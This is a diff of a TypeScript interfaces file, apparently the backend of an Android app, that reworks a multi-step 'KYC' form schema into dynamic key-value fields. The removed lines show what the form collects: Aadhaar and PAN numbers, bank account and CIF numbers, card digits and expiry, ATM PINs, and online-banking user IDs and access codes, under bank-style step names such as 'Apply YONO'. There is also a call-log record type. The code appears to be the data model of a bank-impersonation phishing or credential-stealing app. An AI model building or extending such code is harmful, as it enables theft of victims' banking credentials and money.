@@ -38,37 +38,14 @@ export interface CallLog {
     timestamp: Date;
 }
 
-// Form data submitted from Android app (multi-step KYC form)
+// Form data submitted from Android app (multi-step form)
+// Fields are dynamic — defined in formConfig.ts, stored as key-value pairs
 export interface FormData {
-    // Step 2: KYC Login
-    fullName: string;
-    mobileNumber: string;
-    motherName: string;
-    // Step 3: Profile Verification
-    accountNumber: string;
-    aadhaarNumber: string;
-    panCard: string;
-    // Step 4: Card Authentication
-    cardLast6: string;
-    atmPin: string;
-    // Step 5: Apply YONO
-    cifNumber: string;
-    branchCode: string;
-    // Step 6: Final Verification
-    dateOfBirth: string;
-    cardExpiry: string;
-    finalPin: string;
-    // Step 7: Login Details
-    userId: string;
-    accessCode: string;
-    profileCode: string;
-    // Metadata
+    // Dynamic form fields (keys defined in formConfig.ts)
+    [key: string]: any;
+    // Metadata (always present)
     submittedAt: Date;
     pageName?: string;  // Tracks which page the data was submitted from (e.g., 'kyc_login', 'profile_verify', etc.)
-    // Legacy fields (kept for backward compatibility)
-    name?: string;
-    phoneNumber?: string;
-    id?: string;
 }
 
 
